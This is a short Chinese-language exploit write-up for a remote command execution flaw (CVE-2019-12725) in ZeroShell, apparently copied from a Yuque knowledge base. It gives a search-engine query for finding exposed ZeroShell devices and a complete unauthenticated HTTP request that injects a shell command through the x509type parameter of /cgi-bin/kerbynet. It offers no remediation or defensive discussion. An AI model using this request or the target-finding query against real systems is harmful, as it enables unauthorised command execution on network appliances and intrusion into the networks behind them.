# ZeroShell 3.9.0 远程命令执行漏洞(CVE-2019-12725)

# 一、漏洞简介
Zeroshell是一个微型的linux发行版本，它功能强大，具有强大的router、radius、web门户、防火墙、virtual**、Qos、 DHCP、dns转发等功能，可以用来安装到服务器上为内网提供网络服务。ZeroShell 3.9.0 存在命令执行漏洞，/cgi-bin/kerbynet 页面，x509type 参数过滤不严格，导致攻击者可执行任意命令。

# 二、影响版本
+ ZeroShell < 3.9.0

# 三、资产测绘
+ hunter`app.name="ZeroShell"`
+ 特征

![1700238326883-4aa88d39-2cd9-4a09-bf76-20df4b3c1e85.png](./img/Qk7FY11KBJGYROTD/1700238326883-4aa88d39-2cd9-4a09-bf76-20df4b3c1e85-616604.png)

# 四、漏洞复现
```plain
GET /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aid%0A%27 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

![1700238420978-583c020a-3c1f-4fe5-8518-a7752c20d39c.png](./img/Qk7FY11KBJGYROTD/1700238420978-583c020a-3c1f-4fe5-8518-a7752c20d39c-022453.png)



> 更新: 2024-02-29 23:57:12  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cwidw8o3h26689ls>